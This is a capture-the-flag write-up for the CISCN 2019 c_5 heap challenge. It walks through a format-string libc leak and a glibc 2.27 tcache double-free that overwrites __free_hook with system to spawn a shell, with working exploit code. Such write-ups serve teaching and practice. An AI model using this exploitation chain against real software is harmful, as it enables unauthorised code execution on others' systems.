# CISCN 2019 — c_5: `__printf_chk` format string + tcache double-free → `__free_hook = system`

> Platform: BUUCTF (buuoj.cn) — glibc 2.27 (Ubuntu 18.04)
> Mitigations: **Full RELRO / Canary / NX / PIE / FORTIFY** (all on), stripped
> Flag: `flag{8a7d1b02-1cb8-4580-a9b6-8f3d31f5109b}`

## TL;DR

A small (10 KB) heap challenge where **Edit and Show are stubbed out** — only Add and Delete actually do anything. The exploitable surface boils down to two things: a `__printf_chk(1, user_buf)` format-string at startup and a vanilla UAF / double-free in `delete`. Format-string leaks libc via `_IO_2_1_stderr_` at the 7th `%p`; tcache double-free (no key check in 2.27) pivots `__free_hook` to `system`, then `free("/bin/sh")` shells.

## Surface

```c
int main() {
    char name[32]; read(0, name, 32);
    __printf_chk(1, name);                  // ← format-string (user-controlled fmt)
    char id[8]; read(0, id, 8); puts(id);   // unused (8-byte buf without NUL)
    /* menu: 1=add, 2=edit-stub, 3=show-stub, 4=delete */
}

void add() {
    if (counter > 0x10) puts("Enough!");    // warning only, doesn't return
    int size; scanf("%d", &size);
    if (size < 0 && size > 0x50) exit(0);   // tautologically false — no real check
    entries[counter].size = size;
    entries[counter].ptr  = malloc(size);
    read(0, entries[counter].ptr, size);    // no zeroing of chunk[0] — diff vs c_3
    counter++;
}

void delete() {
    int idx; scanf("%d", &idx);
    free(entries[idx].ptr);                  // doesn't NULL the pointer
}
```

## Exploit

### 1) Libc leak via format string

`__printf_chk` (FORTIFY level 1) blocks `%n` but not reads. The 7th `%p` on the call stack happens to be `_IO_2_1_stderr_` (a fixed-offset libc symbol):

```python
sla(b'name?', b'%p%p%p%p%p%p::%p')
libc_base = int(recv(14), 16) - libc.sym['_IO_2_1_stderr_']
```

Full RELRO would normally make this useless (no GOT to overwrite), but we don't need to — `__free_hook` lives in libc writable data.

### 2) Tcache double-free → poison chain

glibc 2.27 has no `tcache->key` field; the same chunk can be freed back-to-back without trip-wires:

```python
alloc(0x8, b'a')            # idx 0
delete(0); delete(0)        # tcache[0x20]: chunk0 → chunk0 (selfloop)

alloc(0x8, p64(free_hook))  # idx 1: reuse chunk0, overwrite fd = __free_hook
alloc(0x8, b'a')            # idx 2: pop chunk0 again, head ← __free_hook
alloc(0x8, p64(system))     # idx 3: pop __free_hook, write system into *__free_hook
alloc(0x18, b'/bin/sh\x00') # idx 4: payload string
delete(4)                   # free(weapon[4]) → __free_hook(weapon[4]) = system("/bin/sh")
```

Unlike CISCN 2019 c_3, `add` here does **not** zero the first qword of each chunk, so `system(weapon[idx])` receives the user-provided string correctly. No need for one_gadget.

## Differences vs c_3

| | c_3 | c_5 |
|---|---|---|
| RELRO | Partial | **Full** |
| FORTIFY | No | **Yes** (blocks `%n`) |
| `add` zeros `chunk[0]` | Yes | No |
| Leak path | UAF on chunk freed 8× → unsorted bin via tcache overflow | **Format string** `%p` directly |
| Win primitive | one_gadget | **`system("/bin/sh")`** |
| Slot cap | 9 (hard) | 17+ (soft warning only) |

c_5 is materially simpler — almost a 5-line exploit once you recognize the format-string offset.

## Lessons

- **stub-out menu entries are a hint, not a wall** — focus on the entries that *do* work and the path before menu.
- `__printf_chk` only blocks `%n`-family. `%p`/`%s`/`%lx` are free.
- libc-2.27 tcache: no `key`, no size check — double-free + selfloop is the default first move.
- **Always diff `add`'s initializer** — c_3's `chunk[0] = 0` quietly kills `system("/bin/sh")` plans; c_5 doesn't have that, so the simpler chain works.

## References

- Public exp: [Yeuoly/buuctf_pwn — ciscn_2019_c_5](https://github.com/Yeuoly/buuctf_pwn/tree/master/ciscn_2019_c_5)
